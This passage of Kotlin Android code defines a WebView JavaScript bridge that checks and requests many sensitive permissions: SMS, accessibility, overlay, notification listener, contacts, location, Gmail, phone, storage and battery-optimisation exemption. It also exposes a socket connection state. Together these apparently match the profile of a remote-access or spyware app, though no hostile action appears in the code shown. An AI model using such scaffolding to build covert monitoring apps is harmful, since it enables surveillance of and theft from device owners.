        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isCamGranted()            = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted()            = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted()  = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored()     = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()
    @JavascriptInterface fun isWriteSettingsGranted()  = (context as MainActivity).isWriteSettingsGranted()

    @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings()     = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm()      = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm()= (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm()  = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted()        = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm()      = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted()       = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled()            = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm()     = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps()        = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted()       = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm()     = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted()           = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm()         = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted()           = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm()         = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted()  = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm()= (context as MainActivity).requestManageStoragePerm()
    @JavascriptInterface fun requestWriteSettingsPerm()= (context as MainActivity).requestWriteSettingsPerm()
}
